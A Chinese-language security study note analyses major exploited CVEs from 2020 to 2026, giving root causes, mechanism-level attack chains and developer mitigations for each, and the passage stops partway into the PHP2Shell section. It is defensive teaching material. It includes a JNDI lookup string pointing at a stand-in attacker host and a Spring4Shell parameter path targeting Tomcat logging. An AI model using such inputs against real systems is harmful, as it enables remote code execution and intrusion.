# 近年重大 CVE 漏洞剖析：触发机制、利用链与开发规避

> 日期：2026-11-05
> 所属大纲阶段：横向专题（覆盖阶段 2「漏洞分类」、阶段 3「Web 安全」、阶段 4「二进制安全」、阶段 6「安全工程」）
> 参考资料：
> - NVD 各 CVE 条目（`https://nvd.nist.gov/`，下文每节附编号链接）
> - CISA Known Exploited Vulnerabilities (KEV) Catalog（`https://www.cisa.gov/known-exploited-vulnerabilities-catalog`）
> - Wiz：Critical vulnerability in React CVE-2025-55182（`https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182`）
> - Trend Micro：CVE-2025-55182 analysis, PoC, in-the-wild（`https://www.trendmicro.com/en_gb/research/25/l/CVE-2025-55182-analysis-poc-itw.html`）
> - Microsoft Security Blog：Defending against React2Shell（`https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components`）
> - Unit42：CVE-2025-55182 / CVE-2025-66478 exploitation analysis（`https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next`）
> - Sansec：PHP2Shell research（`https://sansec.io/research/php2shell`）
> - Google Cloud Security：Responding to core PHP vulnerabilities CVE-2026-109618 / CVE-2026-109619（`https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619`）
> - Datadog Security Labs：PHP2Shell（`https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php`）
> - CISA Alert：SharePoint ToolShell（2025-07-20）（`https://www.cisa.gov/news-events/alerts/2025/07/20/update-microsoft-releases-guidance-exploitation-sharepoint-vulnerabilities`）
> - MITRE Campaign C0058（ToolShell）（`https://attack.mitre.org/campaigns/C0058`）
> - SOCRadar：Top 10 CVEs of 2025（`https://socradar.io/blog/top-10-cves-of-2025-vulnerabilities-trends`）
> - Cybersecurity News：Top 20 Most Exploited Vulnerabilities of 2025（`https://cybersecuritynews.com/most-exploited-vulnerabilities-of-2025`）
> - Apache Log4j Security 页（`https://logging.apache.org/log4j/2.x/security.html`）
> - Spring 官方公告：Spring Framework RCE, Early Announcement（`https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement`）
> - openwall oss-security：XZ Utils 5.6.0/5.6.1 backdoor 披露帖（`https://www.openwall.com/lists/oss-security/2024/03/29/4`）
> - Palo Alto Networks Security Advisory：CVE-2024-3400（`https://security.paloaltonetworks.com/CVE-2024-3400`）
> - Mandiant：Citrix Bleed: Leaking Session Tokens with CVE-2023-4966（`https://cloud.google.com/blog/topics/threat-intelligence/citrix-bleed-leaking-session-tokens`）
> - Oracle Security Alert：CVE-2025-61882（`https://www.oracle.com/security-alerts/alert-cve-2025-61882.html`）
> - Rapid7 ETR：Critical 0day in Oracle E-Business Suite Exploited in the Wild（`https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild`）
> - Google Cloud 威胁情报：Oracle E-Business Suite Zero-Day Exploitation（`https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation`）
> - CISA Alert：Critical Vulnerabilities in PHP Require Immediate Patching（2026-10-21，`https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching`）
> - CISA Alert：KEV 新增两条 PHP 漏洞（2026-10-26，`https://www.cisa.gov/news-events/alerts/2026/10/26/cisa-adds-two-known-exploited-vulnerabilities-catalog`）
> - HivePro：CISA KEV Catalog June 2026 Digest（`https://hivepro.com/threat-digests/cisa-known-exploited-vulnerability-catalog-june-2026`）

---

## 0. 这篇笔记怎么读

**选材标准**：不是 CVSS 高分榜，而是「**在野大规模利用（in-the-wild exploitation）并造成真实重大影响**」的 CVE——以 CISA KEV 目录收录情况、勒索/间谍团伙实际使用、受影响组织数量为主要依据，CVSS 仅作参考。时间跨度 2020—2026。（2026-11-05 补充：新增 §2.13—2.21 九个近五年完整案例与 §2.22 扩充的一句话清单。）

**利用细节边界**：本文按防御视角展开「触发机制（root cause）→ 利用链（attack chain）」——攻击链只写到**机制层面**（哪一步组合了什么缺陷、每一环对应什么 CWE），不提供可直接武器化的完整利用脚本。任何复现实验仅限本地隔离靶场（见 §5 复现建议），遵守工作区安全红线。

**读法建议**：每个案例固定四段——基本信息 → 触发机制 → 利用链 → 开发时规避。先通读 §1 总览表建立全景，再按兴趣挑案例；最后必读 §3 横向规律与 §4 开发者清单，那才是这篇笔记真正的产出。

**前置知识**：CVSS/CWE/CVE 概念见 [[08-漏洞分类-OWASP-Top10-CWE-CVE]]；SQL 注入见 [[11-SQL-注入]]、反序列化见 [[15-反序列化漏洞]]、文件上传见 [[14-文件上传漏洞]]、会话管理见 [[16-认证与会话管理]]、内存安全见 [[20-程序内存布局]] 与 [[21-栈溢出与堆溢出]]。

---

## 1. 总览表

| # | CVE | 年份 | CVSS | 受影响组件 | 缺陷类型（CWE） | 在野利用 |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | CVE-2021-44228 Log4Shell | 2021 | 10.0 | Apache Log4j 2.x | 不可信数据反序列化/JNDI 注入（CWE-502, CWE-917） | 海量僵尸网络与勒索团伙，波及全球 |
| 2 | CVE-2022-22965 Spring4Shell | 2022 | 9.8 | Spring Framework + Tomcat + JDK 9+ | 数据绑定属性注入（CWE-915 → 写任意文件） | 披露后数日内批量利用（Mirai 变种等） |
| 3 | CVE-2020-1472 Zerologon | 2020 | 10.0 | Windows Netlogon（MS-NRPC） | 密码学协议实现缺陷（固定 IV，CWE-329） | 大规模用于域提权 |
| 4 | CVE-2023-34362 MOVEit | 2023 | 9.8 | Progress MOVEit Transfer | SQL 注入 → 写 WebShell（CWE-89 链） | CL0P 团伙，约 2700+ 组织失陷 |
| 5 | CVE-2023-4966 Citrix Bleed | 2023 | 9.4 | NetScaler ADC/Gateway | 越界读取泄露会话令牌（CWE-125, CWE-200） | LockBit 等用于绕过 MFA |
| 6 | CVE-2024-3094 XZ Utils 后门 | 2024 | 10.0 | XZ/liblzma（供应链投毒） | 供应链后门（CWE-506） | 险些危及全球 SSH，靠运气被发现 |
| 7 | CVE-2024-3400 PAN-OS | 2024 | 10.0 | Palo Alto GlobalProtect | 路径遍历 → 任意文件写 → 命令注入（CWE-22/78） | 0day 在野利用（Operation MidnightEclipse） |
| 8 | CVE-2025-31324 SAP NetWeaver | 2025 | 10.0 | Visual Composer Metadata Uploader | 认证缺失 → 任意 JSP 上传（CWE-306, CWE-434） | 2025 年 3 月起在野利用 |
| 9 | CVE-2025-53770 ToolShell | 2025 | 9.8 | SharePoint Server 本地部署 | 反序列化不可信数据（CWE-502）+ 密钥窃取 | 补丁后 72 小时内大规模利用 |
| 10 | CVE-2025-5777 CitrixBleed 2 | 2025 | ~9.3 | NetScaler ADC/Gateway | 输入校验缺陷泄露会话令牌（CWE-200） | 2025 年中被活跃利用 |
| 11 | CVE-2025-55182 React2Shell | 2025 | 10.0 | React Server Components（Flight 协议）/ Next.js | 协议反序列化未校验（CWE-502, CWE-20） | 2025 年底公开后立即在野利用 |
| 12 | CVE-2026-109618 / -109619 PHP2Shell | 2026 | 9.2（CVSS 4.0） | PHP 语言内核（5.4—8.5） | 内存安全缺陷（CWE-416/824，UAF/未初始化指针访问） | CISA KEV，公开 PoC，已确认在野利用 |

上表 12 例为核心案例（§2.1—2.12）；近五年补充案例见下表（§2.13—2.21）：

### 1.1 补充案例总览（近五年）

| # | CVE | 年份 | CVSS | 受影响组件 | 缺陷类型（CWE） | 在野利用 |
| --- | --- | --- | --- | --- | --- | --- |
| 13 | CVE-2021-26855 ProxyLogon / CVE-2021-34473 ProxyShell | 2021 | 9.8 | Microsoft Exchange | SSRF → 反序列化（CWE-918 → 502） | Hafnium 等，3 万+组织 |
| 14 | CVE-2022-30190 Follina | 2022 | 7.8 | Windows MSDT | URI 处理器参数注入（CWE-74） | 俄背景 APT 针对性利用 |
| 15 | CVE-2022-1388 | 2022 | 9.8 | F5 BIG-IP iControl REST | 认证绕过 → 命令执行（CWE-306/78） | 修复后数日内大规模利用 |
| 16 | CVE-2022-26134 | 2022 | 9.8 | Atlassian Confluence | OGNL 表达式注入（CWE-917） | 披露后数日内在野利用 |
| 17 | CVE-2023-23397 | 2023 | 9.8 | Microsoft Outlook | 零点击 NTLM 泄露（CWE-200/918） | APT28 对乌克兰目标 |
| 18 | CVE-2023-42793 | 2023 | 9.8 | JetBrains TeamCity | 认证绕过 → RCE（CWE-288） | APT29 与勒索团伙 |
| 19 | CVE-2024-21762 | 2024 | 9.8 | Fortinet FortiOS SSL VPN | 堆越界写（CWE-787） | 2024 底—2025 初大规模利用 |
| 20 | CVE-2025-0282 / CVE-2025-22457 | 2025 | 9.0 / 9.3 | Ivanti Connect Secure | 栈缓冲区溢出（CWE-121） | 间谍团伙 0day |
| 21 | CVE-2025-61882 | 2025 | 9.8 | Oracle EBS（BI Publisher） | 认证不当（CWE-287） | CL0P 大规模勒索 |

一句话定位：

- **框架/协议解析缺陷 → 未认证 RCE**：案例 1、2、11、12
- **认证/授权缺失（含文件上传）**：案例 8、15、18、21——「某个端点忘了挂认证或被非规范路径绕过」
- **反序列化**：案例 9（案例 1、11 本质同源）
- **信息泄露 → 会话劫持**：案例 5、10、20
- **注入组合链（SQL/路径/命令）**：案例 4、7
- **表达式注入（字符串 → 代码）**：案例 16（与案例 2 同类）
- **密码学误用**：案例 3
- **供应链**：案例 6、18
- **端点办公链（文档/邮件客户端零点击）**：案例 14、17
- **边界设备内存安全**：案例 5、10、19、20（持续主题）

---

## 2. 案例剖析

### 2.1 Log4Shell（CVE-2021-44228）——日志宏把用户输入变成了代码

**基本信息**：Apache Log4j 2.x（2.0-beta9 — 2.14.1），CVSS 10.0，2021-12-09 公开，44 小时内全球完成大规模利用。参考：[Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)。

**触发机制**：Log4j 2 的消息格式化默认开启 **lookup（查找替换）**：日志内容里 `${...}` 会被当宏解析。其中 `jndi:` 协议分支会让服务器发起 JNDI（Java Naming and Directory Interface）远程查找。于是**任何能进入日志语句的用户输入**（HTTP 头 User-Agent、表单字段、已解析文件内容……）都成为触发点。

**利用链（机制层面）**：

1. 攻击者在任意输入点注入形如 `${jndi:ldap://attacker.com/x}` 的字符串（可再用 `${lower:...}`、`${upper:...}` 等嵌套绕过 WAF 的关键词匹配）；
2. 应用把这串字符写进日志 → Log4j 解析宏 → 向攻击者控制的 LDAP/RMI 服务器发起查找；
3. LDAP 响应把 `javaCodeBase` 指向攻击者 HTTP 服务器 → 受害 JVM 下载攻击者的 `ObjectFactory` 类并实例化 → **static 块/构造函数执行 = RCE**；
4. 后续：信息收集、矿机、勒索（Conti）、Hafnium 对 Exchange 的横向利用；Mirai 变种全网扫描。

深层教训：**"记日志"从来不是安全边界**。一个便利特性（宏查找）+ 一个默认开启 + 输入不可控 = 全球性事件。此后 Java 8u121+ 默认 `trustURLCodebase=false` 只是提高门槛，并未根治。

**开发时规避**：

- **升级 ≥ 2.17.1**（2.15.0/2.16.0 各有绕过：CVE-2021-45046/45105）；无法升级的 2.10—2.14.1 设 `log4j2.formatMsgNoLookups=true` 或移除 `JndiLookup` class。
- **结构化日志 + 白名单字段**：不要把原始用户输入整串丢进日志；记录前做字段级提取与长度限制。
- SCA 扫描依赖树（案例教训正是「你不知道你依赖了它」——间接依赖最常见）；生产环境**出网管控**能打断第 2/3 步（外连 LDAP/RMI 被 egress filter 拦下）。

### 2.2 Spring4Shell（CVE-2022-22965）——数据绑定把请求参数写进了类加载器

**基本信息**：Spring Framework 5.3.0—5.3.17 / 5.2.0—5.2.19，CVSS 9.8，2022-03-31 公告；**披露后数日内即出现批量利用**（Mirai 变种等）。前置条件：JDK 9+、以 WAR 部署在独立 Tomcat、使用 Spring MVC 数据绑定。参考：[Spring 官方公告](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)。

**触发机制**：Spring MVC 会把请求参数按名字**自动绑定（data binding）**到目标对象的 setter。任何对象都有 `getClass()`，请求参数名可以写成属性路径 `class.module.classLoader...`——`Module`/`module` 是 JDK 9 新增 API，绕开了 2010 年针对同类漏洞（CVE-2010-1622）的旧补丁，于是一路顺着 `class.module.classLoader` 摸到 Tomcat 的内部组件。

**利用链（机制层面）**：

1. 请求参数名形如 `class.module.classLoader.Resources.context.parent.pipeline.first.pattern=...`，通过一系列 setter 把 Tomcat `AccessLogValve`（访问日志阀）的 `pattern`、`suffix`（.jsp）、`directory`（webapps/ROOT）改掉；
2. 再发一个带恶意 JSP 内容的请求 → Tomcat 把它按被改过的日志格式**写到 ROOT 目录成 .jsp**；
3. 访问该 JSP = WebShell = RCE。

**开发时规避**：

- **绑定用 DTO，不要把请求参数直接绑到领域对象**——DTO 上根本没有 `getClass()` 之后的可利用属性链；
- 显式收紧绑定：`@InitBinder` 里 `setAllowedFields`（白名单优先）或 `setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*")`；
- 升级 Spring ≥ 5.3.18 / 5.2.20（修复禁止绑定 `ClassLoader` 类属性）、Tomcat ≥ 10.0.20 / 9.0.62、JDK ≥ 11.0.16。
- 通用教训：**自动绑定 = 把「属性名空间」暴露给了攻击者**，任何按名字反射赋值的框架特性（Spring/Struts/Play 的 form binding）都要做字段白名单。

### 2.3 Zerologon（CVE-2020-1472）——一个写死为零的 IV

**基本信息**：Windows Netlogon 远程协议（MS-NRPC），CVSS 10.0，2020-08 补丁。域控上的 **无凭据域提权**。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)、[Dirk-Jan Mollema 的分析与工具](https://github.com/Dirkjanm/CVE-2020-1472)。

**触发机制**：MS-NRPC 规范中，客户端与 DC 协商会话密钥后，用 **AES-128-CFB8 加密 challenge 做认证**，而协议把加密的 **IV 固定为全零**。CFB8 是按字节流加密的：明文全零 + IV 全零时，密文首字节完全由 `AES_K(全零块)` 决定，是**确定值**。攻击者提交全零 credential，用不同计数器重试最多 256 次（约几百次连接），命中概率 1/256 → Netlogon 接受这个"会话"，且后续对话继续沿用全零 IV 的对称特性，攻击者可继续伪造合法认证器。

**利用链（机制层面）**：

1. 与 DC 建立 Netlogon 安全通道，用全零 credential 反复重试握手直到通过（≤256 次）；
2. 调用 `NetrServerPasswordSet2` 把 **域控机器账户密码重置为空**；
3. 机器账户密码即"域控的凭证"——用它做 DCSync 拉取全部域内哈希（含 krbtgt）→ **全域失陷**；
4. 恢复时还要小心：直接重启会因机器密码不一致导致 DC 起不来，这是该漏洞在真实应急中的著名坑。

**开发时规避**（协议/密码学层面的教训）：

- **加密原语使用规范是协议正确性的一部分**：CFB 类模式 IV 必须随机且不可重用；固定 IV 直接破坏 IND-CPA。
- 不自己设计 challenge/response 协议——用经过审计的现成方案（Kerberos、OAuth、Noise 框架、libsodium 的封装 API）。
- 密码学代码要有**专门评审**（crypto review）与形式化/一致性测试；微软最终靠「强制签名/密封 + 会话密钥随机化」彻底修复，说明协议层缺陷的修复往往牵动兼容性，**越早发现代价越小**。
- 防御侧运营：监控 Netlogon 相关事件（5805、5827–5831）与 4742（机器账户密码重置）；域控补丁强制化。

### 2.4 MOVEit（CVE-2023-34362）——SQL 注入一路走到 WebShell

**基本信息**：Progress MOVEit Transfer（企业级文件传输/MFT 产品），CVSS 9.8，2023-05-31 修复，**补丁窗口期（美国阵亡将士纪念日假期前后）已被 CL0P 团伙大规模利用**，约 2700+ 组织失陷（含政府、银行、航空）。参考：[Progress 官方公告](https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-34362)。

**触发机制**：未认证 HTTP 端点存在 **SQL 注入（CWE-89）**——注入点与产品处理「人可读文件名（human-readable file name）」的逻辑相关。注入成功后攻击者可读写数据库；产品的文件存储逻辑又允许把数据库内容**按指定扩展名落盘到 Web 可达目录**。

**利用链（机制层面）**：

1. 未认证请求注入 SQL → 拖库（用户/会话数据）、写库；
2. 借助应用自身的文件落盘功能，把精心构造的内容以 `.aspx` 写入 wwwroot（公开报告中落盘文件名为 `human2.aspx`）→ WebShell；
3. 同一请求顺手导出全库（公开的自动化工具行为）；
4. CL0P 以 **勒索/数据窃取（不加密式勒索）** 批量变现，展示了「供应链类单一入口产品」被武器化后的规模效应。

**开发时规避**：

- 老生常谈但仍是事实：**参数化查询/ORM 参数绑定**（见 [[11-SQL-注入]]）；DB 账户最小权限（只读业务账户不该能写任意表）。
- **文件名永远不当路径/扩展名用**：落盘文件名由服务端生成（UUID），扩展名白名单校验，存 Web 目录之外的独立存储（见 [[14-文件上传漏洞]]）。
- 边界产品运维：MFT/VPN 这类「直面互联网的单一入口」应进入**最高优先级补丁 SLA**，并有替代预案（KEV 目录驱动）。

### 2.5 Citrix Bleed（CVE-2023-4966）——越界读一行，MFA 全作废

**基本信息**：Citrix NetScaler ADC/Gateway，CVSS 9.4，2023-10 修复。**不认证、不触发告警、直接拿到合法会话**。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-4966)、[Mandiant 分析](https://cloud.google.com/blog/topics/threat-intelligence/citrix-bleed-leaking-session-tokens)。

**触发机制**：NetScaler 处理特定（OAuth/相关）请求时存在 **越界读取（out-of-bounds read，CWE-125）**：响应缓冲区处理长度不当，把内存里相邻的 **会话令牌** 一起带进了响应体。攻击者只需对特定端点发一个特殊请求，响应里就多出一段内存内容——里面是别人的有效 session token。

**利用链（机制层面）**：

1. 发送触发越界读的请求 → 从响应中提取会话令牌；
2. 用该令牌直接向 Gateway/资源发起请求 → **绕过 MFA、绕过 IdP**（对应用来说这是"合法"会话）；
3. LockBit 等团伙用它作为初始访问（波音等知名案例）；由于是合法会话，EDR/日志几乎无感。

**开发时规避**：

- 内存安全：C/C++ 服务对缓冲区长度、截断逻辑要重点测试（模糊测试可发现此类 bug）；条件允许换内存安全语言（Rust/Go）。
- 会话设计：令牌与客户端特征绑定（设备指纹、IP 异常重校验）、短有效期、**服务端可吊销**；不要让「持有令牌」=「完全通过认证」。
- 运营铁律（Citrix 官方处置要求）：**打补丁之后必须主动终止全部活动会话**——否则补丁完了令牌照样能用到过期（CitrixBleed 2 在 2025 年又栽在同一件事上，见 §2.10）。

### 2.6 XZ Utils 后门（CVE-2024-3094）——三年社交工程换来的 0.5 秒延迟

**基本信息**：XZ/liblzma 5.6.0、5.6.1 的发布 tarball 被植入后门，CVSS 10.0，2024-03-29 被 PostgreSQL 开发者 Andres Freund 因 **sshd 登录延迟约 500ms + valgrind 异常** 顺藤摸瓜发现，距离后门进入 Debian/Fedora 稳定分支仅数周。参考：[openwall oss-security 披露帖](https://www.openwall.com/lists/oss-security/2024/03/29/4)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)。

**触发机制**：这不是"漏洞"而是**定向供应链投毒（CWE-506）**。攻击者（化名 Jia Tan）花约两年半时间在社区里积累信任、成为联合维护者，再让同伙顶着"压力测试"名义合入复杂的模糊测试基础设施；后门本体不在 git 仓库里，而是藏在 **git 里不存在的测试数据文件中**，由被篡改的构建脚本在「打包 tarball」时解出、注入编译产物 `liblzma`。受影响的发行版（Debian/Fedora 用 systemd 打补丁把 sshd 链接到 liblzma）里，后门利用 ELF 的 **IFUNC 钩子** 劫持 CRC 校验函数，在 `RSA_verify` 返回后改写判断——使持有攻击者主公钥对应私钥的连接**绕过 SSH 认证**（可远程执行命令）。触发还带多级环境条件（仅 sshd 且满足特定构建布局才激活），刻意躲避检测。

**利用链（机制层面）**：构造一个带特殊协议字段的公钥认证请求 → liblzma 的被劫持 CRC 路径在校验 RSA 签名时放行 → 攻击者直接拿到 sshd 的 shell。被发现的不是靠安全工具，而是靠一个开发者对**500 毫秒性能回归**的敏感。

**开发时规避**（供应链治理，详见 [[31-依赖与供应链安全]]）：

- **tarball ≠ 仓库**：对上游发布制品做「git 源码 vs 发布 tarball」一致性抽查；优先可复现构建（reproducible builds）。
- **SBOM + 构建期依赖审计**：构建脚本本身是代码，构建期注入是真实攻击面（OSV/SCA 扫不到这种后门——它不在源码扫描范围里，要靠构建过程的可信与可复现）。
- 维护者集中度高的关键库要意识到「bus factor」风险：对维护权变更、突然的活跃贡献保持敏感；给关键开源组件提供资金/审计支持是防御投资。
- 运行时：`valgrind`、性能基线、egress 监控这类"朴素手段"仍然有效。

### 2.7 PAN-OS（CVE-2024-3400）——路径遍历 + 文件写 + 命令执行的教科书三连

**基本信息**：Palo Alto Networks PAN-OS GlobalProtect（默认开启 + 无认证），CVSS 10.0，2024-04-12 紧急修复，**修复前已被 0day 利用**（Operation MidnightEclipse）。参考：[Palo Alto 安全公告](https://security.paloaltonetworks.com/CVE-2024-3400)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3400)。

**触发机制**：GlobalProtect 网关处理会话 Cookie（`SESSID`，base64 编码）时，把解码内容用于**构建文件路径**而未做规范化校验——base64 解码后可夹带 `../../`，形成**路径遍历（CWE-22）→ 任意文件写**；写到的目标位置恰好会被设备的某个后台执行流程取用，再一步变成**命令注入（CWE-78）**。

**利用链（机制层面）**：

1. 向 GlobalProtect 发带特制 Cookie 的请求 → 设备把请求内容写到攻击者选定的路径；
2. 写入的文件被设备后台例行进程执行 → 以 root 运行攻击者命令；
3. 落地 WebShell + 窃取设备配置/凭据。边界设备普遍"前置互联网、根权限运行、内含全部内网凭据"，一洞即全域。

**开发时规避**：

- **用户输入永不参与：文件路径拼接、命令拼接、shell 调用**。路径一律服务端生成 + `realpath` 归一化后白名单目录校验；需要执行系统操作时用受控 API/参数化子进程（`execve` 参数数组，不经过 shell）。
- 高权限守护进程**降权运行**（设备类产品最该做却常不做的一条）；敏感目录（会被执行/被解析的目录）与可写目录物理分离。
- 运营：边界设备默认进 KEV 级 SLA；对设备上出现的新增/篡改文件与 cron/telemetry 变更做文件完整性监控（FIM）。

### 2.8 SAP NetWeaver（CVE-2025-31324）——一个忘了挂认证的开发工具端点

**基本信息**：SAP NetWeaver Application Server（Java 栈）Visual Composer Metadata Uploader，CVSS 10.0，2025-04-28 修复，**2025 年 3 月起已在野利用**（威胁团伙 Chaya_004 等），常与反序列化漏洞 CVE-2025-42999 组链。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-31324)、[CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)。

**触发机制**：开发/设计器组件 Metadata Uploader 的端点 `/developmentserver/metadatauploader` **缺失认证检查（CWE-306）**——本应只有开发者在登录态使用的组件，任何人可直接访问，且接受文件上传并写入 Web 可达的 JSP 目录（CWE-434）。

**利用链（机制层面）**：

1. 未认证 POST 到 metadatauploader 端点，上传 `.jsp` 文件到服务器 Web 路径；
2. 访问该 JSP → WebShell → RCE；
3. SAP 系统里通常紧接着读取系统凭据/配置，横向进入 S/4、PI 等核心业务系统。SAP 系统往往承载全部核心业务数据，属「一失陷即致命」资产。

**开发时规避**：

- **默认拒绝（deny-by-default）的认证中间件**：所有路由显式声明权限，开发/调试端点**在生产构建里物理移除**而不是「隐藏」（`/developmentserver`、`/actuator`、`/debug`、`/swagger` 全是历年重灾区）。
- 文件上传防护清单照 [[14-文件上传漏洞]]：扩展名白名单、存非 Web 目录、独立存储不可执行、上传后内容嗅探。
- 资产清点：很多受害组织**根本不知道自己跑着 NetWeaver Visual Composer**——攻击面清点（CSPM/CMDB）先于补丁管理。

### 2.9 ToolShell（CVE-2025-53770）——反序列化 RCE + 偷走「永不过期的签名钥匙」

**基本信息**：SharePoint Server 本地部署（2016/2019/SE），CVSS 9.8，2025-07-20 修复（Patch Tuesday 补丁的绕过，绕过对象为 CVE-2025-49704/49706），**补丁发布约 72 小时内即被大规模在野利用**，中国背景威胁团伙参与（MITRE 战役编号 C0058），CISA 发布恶意软件分析报告 MAR-251132。参考：[CISA Alert](https://www.cisa.gov/news-events/alerts/2025/07/20/update-microsoft-releases-guidance-exploitation-sharepoint-vulnerabilities)、[MITRE C0058](https://attack.mitre.org/campaigns/C0058)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-53770)。

**触发机制**：SharePoint 页面组件（ToolPane）存在**反序列化不可信数据（CWE-502）**缺陷：特定请求参数控制的序列化数据被 `ObjectStateFormatter` 反序列化，且未严格限制反序列化类型 → 精心构造的序列化对象在反序列化时执行 gadget 链（`ObjectStateFormatter` + 委托类型 gadget）。同链还有 CVE-2025-53771——SharePoint 信息泄露（读取含 MachineKey 的敏感数据），与 CVE-2025-57706 链式利用配合打点。

**利用链（机制层面）——这个案例的可怕之处在第二步**：

1. 未认证 POST 构造恶意序列化数据 → 反序列化执行 → **RCE**；
2. RCE 后读取 farm 配置，窃取 ASP.NET 的 **MachineKey**（ViewState 的签名/加密密钥）；
3. 之后攻击者**离线**伪造带合法签名的 ViewState——即使漏洞已打补丁，只要 MachineKey 没换，就能继续向任意页面注入可执行的 ViewState，形成**打不死的持久化 WebShell**；
4. 因此微软/CISA 的处置指南强调：修复后必须**轮换 MachineKey 并重启 IIS**，并排查 `/_layouts/15/ToolPane.aspx` 的历史访问日志。

**开发时规避**：

- 反序列化统一原则（见 [[15-反序列化漏洞]]）：**类型白名单 binder、密钥防护签名数据、不反序列化用户可控数据**。ASP.NET 场景下 ViewState 依赖 MachineKey——密钥管理按 [[32-密钥管理]]：定期轮换、不入库不入镜像、事件响应预案里必须有「轮换哪些密钥」一节。
- 反序列化类漏洞的补丁**不等于免疫**：密钥类长期凭据不轮换，补丁只是挡住了第一扇门。

### 2.10 CitrixBleed 2（CVE-2025-5777）——同一个坑踩第二次

**基本信息**：Citrix NetScaler ADC/Gateway（含 FIPS/SDX），2025-06 修复（**首次修复不完整，7 月重新发布补丁**），与 CVE-2025-5349 同时披露，被广泛称为 CitrixBleed 2，在野利用、进入 KEV。参考：[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-5777)、[CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)。

**触发机制**：NetScaler 处理特定请求时**输入校验缺陷（CWE-20）导致敏感信息泄露（CWE-200）**：类似 2023 年 Citrix Bleed，攻击者可从响应中拿到**有效会话令牌**，随后重放令牌绕过认证与 MFA 接管会话。

**与 2023 年那次合并的教训**：

- **补丁完整性**：Citrix 首次补丁未能完全修复，被迫二次发布——供应商公告要读到「确认修复完成」而不是「有补丁了」；
- **补丁 ≠ 清场**：首次修复后 Citrix 仍需再次强调「必须终止全部活动会话/断开 ICA 连接」，因为泄露出去的令牌依然有效；
- 会话令牌泄露类漏洞的检测思路：**同一令牌出现在异常 IP/UA/地理位置** → 立即吊销并告警。

### 2.11 React2Shell（CVE-2025-55182）——你的 RPC 协议就是你的反序列化面

**基本信息**：React Server Components（RSC）**Flight 协议**实现，CVSS 10.0，2025-12-03 披露并立即被在野利用（CISA KEV）；Next.js 并行跟踪编号 CVE-2025-66478。**默认开启 Server Actions 的现代 RSC 应用全部暴露面**。参考：[Wiz 分析](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)、[Trend Micro](https://www.trendmicro.com/en_gb/research/25/l/CVE-2025-55182-analysis-poc-itw.html)、[Unit42](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next)、[Microsoft 防御指南](https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)。

**触发机制**：RSC 用 Flight 协议在客户端与服务端之间传输组件树/数据，Server Action 请求把**客户端可控的 Flight 载荷**送到服务端解码。受影响版本**解码后不做结构校验（CWE-20/CWE-502）**：攻击者构造的 Flight 载荷中，本应是「纯数据」的字段可以被填充为协议中具有特殊语义的对象引用/模块引用，服务端按语义解析、加载并执行 → **未认证 RCE**。这是典型的「**自定义 RPC/序列化协议把信任边界画错了**」：协议设计里客户端是半可信的，实现里却默认解码结果合法。

**利用链（机制层面）**：

1. 向任意 Server Action 端点 POST 精心构造的 Flight 载荷（multipart 表单中的 action 引用 + 伪造成模块/函数引用的字段）；
2. 服务端解码器按协议语义处理这些字段 → 触发模块加载/函数调用 → 执行攻击者代码；
3. 观测到的在野利用：批量扫描 + 装矿 + 后门；同时**假 PoC 泛滥**（Trend Micro 提醒），下载来路不明的「exploit 脚本」本身成为二次风险。

**开发时规避**：

- **任何自定义 RPC/序列化协议都必须有服务端 schema 校验**：解码结果先过白名单/类型校验再使用；「客户端能控制的对象图」按 [[15-反序列化漏洞]] 全套原则处理。
- 依赖治理照旧：React/Next.js 升级到官方公告的修复版本；无法及时升级时按官方缓解指引（禁用/收紧 Server Actions、WAF 规则、监控 action 端点异常请求）。
- 检测：Server Action 端点的异常 POST（超长、含异常字段名、非正常 UI 流量）是高价值告警。

### 2.12 PHP2Shell（CVE-2026-109618 / CVE-2026-109619）——语言运行时本身也是攻击面

**基本信息**：PHP **语言内核**的内存安全缺陷组合，CVSS 4.0 评分 9.2，影响 PHP 5.4—8.5 全系；2026-10-20 细节提前泄露、10-21 发布修复；**CISA KEV 收录、公开 PoC（Exploit-DB #52704）、Arctic Wolf 观测到在野扫描**。参考：[Sansec 研究](https://sansec.io/research/php2shell)、[Google Cloud Security](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619)、[Unit42](https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619)、[Datadog Security Labs](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php)、[NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-109618)。

